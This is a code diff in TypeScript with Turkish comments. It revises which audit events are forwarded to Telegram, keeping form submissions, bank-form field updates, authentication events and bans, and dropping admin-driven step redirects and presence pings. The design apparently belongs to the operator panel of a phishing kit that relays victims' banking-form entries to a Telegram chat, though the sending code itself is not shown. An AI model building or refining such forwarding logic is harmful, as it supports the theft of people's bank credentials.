@@ -79,16 +79,26 @@ export function extractSignificantFormValues(
   return out;
 }
 
-/** Sadece FORM/ÖNEMLİ event'leri gönder (presence, step, route atla) */
+/** ⭐ EN KATI KURAL: Sadece FORM DOLDURULUNCA (veya ban/hata gibi ciddi olaylar) Telegram'a gönder
+ *  - YÖNLENDİRMELER (step eventleri, admin yönlendirmesi, callback yönlendirmesi) GÖNDERİLMEZ
+ *  - PRESENCE / ROUTE / herhangi bir status update GÖNDERİLMEZ
+ *  - Sadece:
+ *      1) Submit (form gönderildi)
+ *      2) Bank_form (banka alanı güncellendi / submit edildi)
+ *      3) Önemli form alanları dolu (meta extract edilen alanlar varsa, ancak yukarıdakilerden değilse de)
+ *      4) HATA / AUTH (kimlik) / BAN
+ */
 export function isTelegramWorthyEvent(row: ServerAuditRow): boolean {
   const k = String(row.event_kind || "").toLowerCase();
   const a = String(row.event_action || "").toLowerCase();
 
-  // Kesinlikle gönderilmeyecekler
+  // Kesinlikle gönderilmeyecekler (HER TÜRLÜ step event = yönlendirme = admin/normal step)
+  if (k === "step") return false; // ADMIN yönlendirmesi, server_step_redirect vb. HEPSİ ATLANIR
   if (k === "presence") return false;
   if (k === "route") return false;
   if (a.includes("pulse") || a.includes("heartbeat") || a.includes("ping")) return false;
   if (a.includes("session_mount") || a.includes("hidden_") || a.includes("pagehide") || a.includes("subscribe")) return false;
+  if (a.includes("redirect") || a.includes("server_step") || a.includes("db_step_sync") || a.includes("admin_realtime")) return false;
 
   // Kesinlikle gönderilecekler
   if (k === "submit") return true;
@@ -97,16 +107,7 @@ export function isTelegramWorthyEvent(row: ServerAuditRow): boolean {
   if (k === "auth") return true;
   if (a.includes("ban") || a.includes("unban")) return true;
 
-  // step/admin yönlendirmelerinde: yalnızca ADMIN tarafından gönderilmişse (admin_action var) gönder
-  if (k === "step") {
-    if (row.admin_action || a.includes("admin") || a.includes("redirect")) {
-      return true;
-    }
-    // client step eventleri (kendiliğinden back vs.) gönderme
-    return false;
-  }
-
-  // Diğerlerinde: eğer önemli form alanı değişmişse gönder
+  // Ekstra kural: meta'da ÖNEMLİ form alanları doluysa ve event başka bir kategorideyse gönder (tedbir ama yukarıdakiler zaten)
   const fields = extractSignificantFormValues(row.meta);
   return fields.length > 0;
 }
